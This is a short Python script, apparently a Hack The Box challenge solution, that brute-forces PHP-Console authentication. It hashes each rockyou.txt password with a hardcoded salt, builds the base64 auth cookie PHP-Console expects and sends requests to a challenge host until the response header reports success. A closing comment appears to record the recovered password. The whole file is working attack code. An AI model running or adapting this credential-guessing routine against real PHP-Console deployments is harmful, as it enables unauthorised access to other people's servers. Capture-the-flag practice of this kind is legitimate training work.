import requests
import base64
import hashlib
import json
import os

with open('./rockyou.txt', 'r', encoding='utf-8') as f:
    for passw in f.readlines():
        print(passw)
        password = passw.strip() + "NeverChangeIt:)"
        passwordHash = hashlib.sha256(password.encode()).hexdigest()
        publicKey = 'd1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e'
        tmpStr = passwordHash + publicKey
        token = hashlib.sha256(tmpStr.encode()).hexdigest()
        tmpDict = {"php-console-client": 5, "auth": {"publicKey": "d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e",
                                                     "token": token}}

        tmpStr = base64.b64encode(json.dumps(tmpDict).encode()).decode()
        cookie = "ajs_group_id=null; ajs_anonymous_id=%226f0bbcdf-dddb-4f20-a4af-7d562cabb89d%22; ajs_user_id=%22264c7a4a1c61c76fea59d99021fbdab9%22; php-console-server=5; php-console-client=" + tmpStr
        headers = {
            "User_Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36", "Cookie": cookie}
        res = requests.get(
            'http://docker.hackthebox.eu:31718/', headers=headers)
        phpconsole = json.loads(res.headers['PHP-Console'])
        if phpconsole['auth']['isSuccess'] != False:
            print('got')
            exit(0)
# poohbear
